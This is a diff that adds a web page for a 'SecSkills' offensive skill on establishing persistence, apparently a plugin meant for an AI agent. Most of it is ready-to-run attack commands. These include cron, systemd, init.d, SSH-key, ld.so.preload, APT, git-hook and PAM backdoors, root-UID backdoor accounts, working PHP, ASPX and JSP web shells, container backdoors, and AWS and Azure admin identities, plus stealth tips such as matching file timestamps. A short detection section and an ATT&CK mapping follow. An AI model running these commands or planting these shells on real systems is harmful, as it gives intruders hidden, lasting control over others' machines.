@@ -1,0 +1,355 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>establishing-persistence — SecSkills</title><link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9B%A1%EF%B8%8F%3C/text%3E%3C/svg%3E"><link rel="stylesheet" href="style.css"><style>
+    .shead{padding:56px 0 34px}
+    .crumb{font-family:var(--mono);font-size:12.5px;color:var(--muted);margin-bottom:20px}
+    .crumb a{color:var(--muted)}
+    h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
+    .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
+    .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
+    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
+    .inst .p{color:var(--faint);user-select:none}
+    article{padding:44px 0 72px;border-top:1px solid var(--border)}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
+    article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
+    article p{margin:0 0 15px;max-width:74ch}
+    article ul,article ol{margin:0 0 16px;padding-left:22px;max-width:74ch}
+    article li{margin:5px 0}article li>ul{margin:5px 0}
+    article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
+    article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
+    article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
+    .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
+    article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    </style></head><body>
+<div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
+<nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
+<button class="tbtn" id="tbtn" aria-label="Toggle theme">theme</button></div></div>
+<header class="shead"><div class="wrap">
+  <div class="crumb"><a href="index.html">secskills</a> / offense / establishing-persistence</div>
+  <h1 class="sk">establishing-persistence</h1>
+  <div class="stags">
+    <span><span class="dot dot-offense"></span> offense</span>
+    <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
+  </div>
+  <p class="sdesc">Establish persistence on Windows and Linux systems using registry keys, scheduled tasks, services, cron jobs, SSH keys, backdoor accounts, and rootkits. Use when performing post-exploitation or maintaining long-term access.</p>
+  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+<span class="p">$ </span>/plugin install secskills-core</div>
+</div></header>
+<article><div class="wrap"><h2>When to Use</h2>
+<ul>
+<li>Maintaining access to compromised systems</li>
+<li>Post-exploitation techniques</li>
+<li>Red team operations</li>
+<li>Persistence testing</li>
+<li>Backdoor creation</li>
+</ul>
+<h2>When NOT to Use</h2>
+<ul>
+<li><strong>Before you have access</strong> — use the relevant initial access or privilege</li>
+</ul>
+<p>escalation skill first</p>
+<ul>
+<li><strong>Building malware, implants, or loaders</strong> — out of scope</li>
+<li><strong>Finding an attacker's persistence as a defender</strong> — use</li>
+</ul>
+<p><a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a> and <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a></p>
+<h2>Windows Persistence</h2>
+<p>The exhaustive Windows command catalog — registry Run keys, scheduled tasks, services, WMI event subscriptions, startup folder, DLL hijacking, IFEO, AppInit_DLLs, and backdoor accounts — lives in <a href="references/windows-persistence-commands.md">references/windows-persistence-commands.md</a>.</p>
+<h2>Linux Persistence</h2>
+<h3>Cron Jobs</h3>
+<pre><code># User crontab (no sudo needed)
+crontab -e
+# Add:
+@reboot /tmp/.backdoor
+0 * * * * /tmp/.backdoor  # Every hour
+
+# System-wide cron (requires root)
+echo "@reboot root /tmp/.backdoor" &gt;&gt; /etc/crontab
+
+# Cron.d directory
+echo "* * * * * root /tmp/.backdoor" &gt; /etc/cron.d/backdoor
+
+# Daily/hourly cron scripts
+cp backdoor.sh /etc/cron.daily/update
+chmod +x /etc/cron.daily/update</code></pre>
+<h3>Systemd Services</h3>
+<pre><code># Create service file
+cat &gt; /etc/systemd/system/backdoor.service &lt;&lt; EOF
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/tmp/.backdoor
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Enable and start
+systemctl daemon-reload
+systemctl enable backdoor.service
+systemctl start backdoor.service
+
+# Verify
+systemctl status backdoor.service</code></pre>
+<h3>RC Scripts (Init.d)</h3>
+<pre><code># Create init script
+cat &gt; /etc/init.d/backdoor &lt;&lt; EOF
+#!/bin/bash
+### BEGIN INIT INFO
+# Provides: backdoor
+# Required-Start: \$network
+# Required-Stop:
+# Default-Start: 2 3 4 5
+# Default-Stop: 0 1 6
+### END INIT INFO
+/tmp/.backdoor &amp;
+EOF
+
+chmod +x /etc/init.d/backdoor
+update-rc.d backdoor defaults</code></pre>
+<h3>SSH Keys</h3>
+<pre><code># Add attacker's public key
+mkdir -p /root/.ssh
+echo "ssh-rsa AAAA...attacker_key" &gt;&gt; /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+
+# For specific user
+echo "ssh-rsa AAAA...attacker_key" &gt;&gt; /home/user/.ssh/authorized_keys</code></pre>
+<h3>.bashrc / .bash_profile</h3>
+<pre><code># Add to user's .bashrc
+echo "/tmp/.backdoor &amp;" &gt;&gt; ~/.bashrc
+echo "/tmp/.backdoor &amp;" &gt;&gt; ~/.bash_profile
+
+# Root .bashrc
+echo "/tmp/.backdoor &amp;" &gt;&gt; /root/.bashrc</code></pre>
+<h3>LD_PRELOAD</h3>
+<pre><code># Hijack library loading
+echo "/tmp/evil.so" &gt; /etc/ld.so.preload
+
+# Will load evil.so into every process</code></pre>
+<h3>MOTD Backdoor</h3>
+<pre><code># Add to message of the day scripts (runs on SSH login)
+echo "/tmp/.backdoor &amp;" &gt;&gt; /etc/update-motd.d/00-header
+chmod +x /etc/update-motd.d/00-header</code></pre>
+<h3>APT/Package Manager</h3>
+<pre><code># APT hook (Debian/Ubuntu)
+cat &gt; /etc/apt/apt.conf.d/99backdoor &lt;&lt; EOF
+APT::Update::Pre-Invoke {"/tmp/.backdoor &amp;";};
+EOF
+
+# Runs before apt update</code></pre>
+<h3>Git Hooks</h3>
+<pre><code># If git repositories exist
+echo "/tmp/.backdoor &amp;" &gt; /path/to/repo/.git/hooks/post-checkout
+chmod +x /path/to/repo/.git/hooks/post-checkout
+
+# Triggers on git checkout</code></pre>
+<h3>Backdoor Accounts</h3>
+<pre><code># Create backdoor user with root UID
+useradd -u 0 -o -g 0 -M -d /root -s /bin/bash backdoor
+echo "backdoor:P@ssw0rd" | chpasswd
+
+# Or add to /etc/passwd directly
+echo "backdoor:x:0:0::/root:/bin/bash" &gt;&gt; /etc/passwd
+echo "backdoor:$(openssl passwd -6 P@ssw0rd):::::::" &gt;&gt; /etc/shadow</code></pre>
+<h3>PAM Backdoor</h3>
+<pre><code># Add to /etc/pam.d/sshd or /etc/pam.d/common-auth
+# Use custom PAM module that accepts magic password
+auth sufficient pam_unix.so try_first_pass
+auth sufficient /lib/security/pam_backdoor.so</code></pre>
+<h2>Web Shells</h2>
+<h3>PHP Web Shell</h3>
+<pre><code>&lt;?php
+// simple.php
+system($_GET['cmd']);
+?&gt;
+
+// Advanced
+&lt;?php
+if($_GET['key'] == 'secret') {
+    eval($_POST['cmd']);
+}
+?&gt;</code></pre>
+<p><strong>Upload Locations:</strong></p>
+<pre><code># Web roots
+/var/www/html/
+/var/www/
+/usr/share/nginx/html/
+C:\inetpub\wwwroot\
+
+# Hidden names
+.htaccess.php
+favicon.ico.php
+robots.txt.php</code></pre>
+<h3>ASP/ASPX Web Shell</h3>
+<pre><code>&lt;%@ Page Language="C#" %&gt;
+&lt;%
+Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd());
+%&gt;</code></pre>
+<h3>JSP Web Shell</h3>
+<pre><code>&lt;%
+Runtime.getRuntime().exec(request.getParameter("cmd"));
+%&gt;</code></pre>
+<h2>Container Persistence</h2>
+<p><strong>Docker:</strong></p>
+<pre><code># Modify container to restart always
+docker update --restart=always container_name
+
+# Add to docker-compose.yml
+restart: always
+
+# Create new container with backdoor
+docker run -d --restart=always --name backdoor evil_image</code></pre>
+<p><strong>Kubernetes:</strong></p>
+<pre><code># DaemonSet (runs on all nodes)
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: backdoor
+spec:
+  selector:
+    matchLabels:
+      name: backdoor
+  template:
+    metadata:
+      labels:
+        name: backdoor
+    spec:
+      containers:
+      - name: backdoor
+        image: attacker/backdoor:latest</code></pre>
+<h2>Cloud Persistence</h2>
+<h3>AWS</h3>
+<pre><code># Create IAM user
+aws iam create-user --user-name backdoor
+
+# Attach admin policy
+aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Create access key
+aws iam create-access-key --user-name backdoor
+
+# Lambda function persistence
+# Create Lambda that executes periodically via CloudWatch Events</code></pre>
+<h3>Azure</h3>
+<pre><code># Create service principal
+az ad sp create-for-rbac --name "backdoor" --role Contributor
+
+# Create managed identity
+az identity create --name backdoor --resource-group RG
+
+# Function App persistence
+# Deploy Azure Function that runs on schedule</code></pre>
+<h2>Rootkits</h2>
+<p><strong>User-mode Rootkit:</strong></p>
+<ul>
+<li>Hook library functions</li>
+<li>Process hiding</li>
+<li>File hiding</li>
+<li>Network hiding</li>
+</ul>
+<p><strong>Kernel-mode Rootkit:</strong></p>
+<ul>
+<li>Loadable kernel module (LKM)</li>
+<li>Hooks system calls</li>
+<li>Harder to detect</li>
+<li>Requires root</li>
+</ul>
+<pre><code># Example LKM (requires kernel headers)
+# Compile and load malicious kernel module
+insmod backdoor.ko</code></pre>
+<h2>Persistence Detection</h2>
+<p><strong>Windows:</strong></p>
+<pre><code># Check Run keys
+Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+
+# Check scheduled tasks
+Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}
+
+# Check services
+Get-Service | Where-Object {$_.StartType -eq "Automatic"}
+
+# Check WMI subscriptions
+Get-WMIObject -Namespace root\Subscription -Class __EventFilter
+Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
+Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</code></pre>
+<p><strong>Linux:</strong></p>
+<pre><code># Check cron jobs
+crontab -l
+ls -la /etc/cron.*
+cat /etc/crontab
+
+# Check systemd services
+systemctl list-unit-files --type=service --state=enabled
+
+# Check init scripts
+ls -la /etc/init.d/
+
+# Check SSH authorized_keys
+cat ~/.ssh/authorized_keys
+cat /root/.ssh/authorized_keys
+
+# Check LD_PRELOAD
+cat /etc/ld.so.preload
+
+# Check for hidden files
+find / -name ".*"</code></pre>
+<h2>OpSec Tips</h2>
+<ul>
+<li><strong>Blend in</strong> - Use system-like names (WindowsUpdate, SystemCheck)</li>
+<li><strong>Redundancy</strong> - Establish multiple persistence methods</li>
+<li><strong>Stealth</strong> - Avoid noisy methods that generate logs</li>
+<li><strong>Cleanup</strong> - Remove persistence when engagement ends</li>
+<li><strong>Timestamps</strong> - Match file timestamps to system files</li>
+</ul>
+<h2>Tools</h2>
+<ul>
+<li><strong>PowerSploit</strong> - PowerShell post-exploitation</li>
+<li><strong>Empire</strong> - Post-exploitation framework</li>
+<li><strong>Metasploit</strong> - Persistence modules</li>
+<li><strong>SILENTTRINITY</strong> - Modern C2 framework</li>
+<li><strong>Covenant</strong> - .NET C2 framework</li>
+</ul>
+<h2>ATT&amp;CK Coverage</h2>
+<p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
+<p><strong>Execution</strong> (TA0002)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1053/">T1053</a> Scheduled Task/Job <em>(also Persistence, Privilege Escalation)</em></li>
+</ul>
+<p><strong>Persistence</strong> (TA0003)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1053/003/">T1053.003</a> Cron — see also <a class="xref" href="escalating-linux-privileges.html"><code>escalating-linux-privileges</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1053/005/">T1053.005</a> Scheduled Task</li>
+<li><a href="https://attack.mitre.org/techniques/T1098/">T1098</a> Account Manipulation <em>(also Privilege Escalation)</em> — see also <a class="xref" href="attacking-active-directory.html"><code>attacking-active-directory</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1136/">T1136</a> Create Account — see also <a class="xref" href="attacking-active-directory.html"><code>attacking-active-directory</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1505/003/">T1505.003</a> Web Shell — see also <a class="xref" href="testing-web-applications.html"><code>testing-web-applications</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1543/">T1543</a> Create or Modify System Process <em>(also Privilege Escalation)</em></li>
+<li><a href="https://attack.mitre.org/techniques/T1543/002/">T1543.002</a> Systemd Service — see also <a class="xref" href="escalating-linux-privileges.html"><code>escalating-linux-privileges</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1543/003/">T1543.003</a> Windows Service — see also <a class="xref" href="escalating-windows-privileges.html"><code>escalating-windows-privileges</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1546/">T1546</a> Event Triggered Execution <em>(also Privilege Escalation)</em></li>
+<li><a href="https://attack.mitre.org/techniques/T1546/003/">T1546.003</a> Windows Management Instrumentation Event Subscription — see also <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1547/">T1547</a> Boot or Logon Autostart Execution <em>(also Privilege Escalation)</em></li>
+<li><a href="https://attack.mitre.org/techniques/T1547/001/">T1547.001</a> Registry Run Keys / Startup Folder</li>
+<li><a href="https://attack.mitre.org/techniques/T1556/">T1556</a> Modify Authentication Process <em>(also Credential Access)</em> — see also <a class="xref" href="attacking-active-directory.html"><code>attacking-active-directory</code></a></li>
+</ul>
+<p><strong>Defense Evasion</strong> (TA0005)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1036/">T1036</a> Masquerading — see also <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a></li>
+</ul>
+<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
+<h2>References</h2>
+<ul>
+<li>https://attack.mitre.org/tactics/TA0003/</li>
+<li>https://book.hacktricks.xyz/</li>
+<li>https://github.com/PowerShellMafia/PowerSploit</li>
+</ul></div></article>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
